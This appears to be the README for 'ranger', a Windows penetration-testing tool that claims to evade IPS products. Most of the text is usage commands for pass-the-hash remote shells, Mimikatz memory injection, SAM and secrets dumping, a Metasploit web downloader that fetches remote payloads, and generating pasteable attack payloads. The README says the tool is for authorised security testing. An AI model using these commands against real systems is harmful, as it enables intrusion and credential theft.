# ranger
A tool to support security professionals access and interact with remote Microsoft Windows based systems.

This project was conceptualized with the thought process, we did not invent the bow or the arrow, 
just a more efficient way of using it.

Ranger is a command-line driven attack and penetration testing tool, which as the ability to use 
an instantiated catapult server to deliver capabilities against Windows Systems.  As long as a user 
has a set of credentials or a hash set (NTLM, LM, LM:NTLM) he or she can gain access to systems that 
are apart of the trust.

Using this capability a security professional can extract credentials out of memory in clear-text, 
access SAM tables, run commands, execute PowerShell scripts, Windows Binaries, and other tools.  
At this time the tool bypasses the majority of IPS vendor solutions unless they have been custom 
tuned to detect it. The tool was developed using our home labs in an effort to support security 
professionals doing legally and/or contractually supported activities.

More functionality is being added, but at this time the tool uses the community contributions 
from repositories related to the PowerShell PowerView, PowerShell Mimikatz and Impacket teams.  

Find Logged In Users
ranger.py [-u Administrator] [-p Password1] [-d Domain] --scout

SMBEXEC Command Shell:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv

PSEXEC Command Shell:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv

PSEXEC Command Execution:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv

WMIEXEC Command Execution:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"

WMIEXEC PowerShell Mimikatz Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker

WMIEXEC Metasploit web_downloader Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader

WMIEXEC Custom Code Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"

ATEXEC Command Execution:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder

ATEXEC PowerShell Mimikatz Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder

ATEXEC Metasploit web_downloader Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder

ATEXEC Custom Code Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder

SECRETSDUMP Custom Code Memory Injector:
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump

Create Pasteable Mimikatz Attack:
ranger.py --invoker -q -v -vv -vvv

Create Pasteable web_downloader Attack:
ranger.py --downloader -q -v -vv -vvv

Create Pasteable Executor Attack:
ranger.py --executor -q -v -vv -vvv
